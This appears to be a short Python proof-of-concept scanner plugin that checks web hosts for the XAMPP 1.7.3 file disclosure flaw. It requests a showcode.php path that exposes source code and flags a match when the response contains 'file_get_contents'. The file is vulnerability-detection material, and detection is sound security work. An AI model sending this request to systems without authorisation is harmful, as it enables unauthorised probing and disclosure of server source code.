#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name   :   XAMPP <= 1.7.3 File disclosure vulnerability
#Reference  :   http://www.exploit-db.com/exploits/15370/

import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    url = arg + "xampp/showcode.php/showcode.php?showcode=1"
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find('file_get_contents') != -1 :
        security_hole('Verify url: ' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://www.example.com/')[1])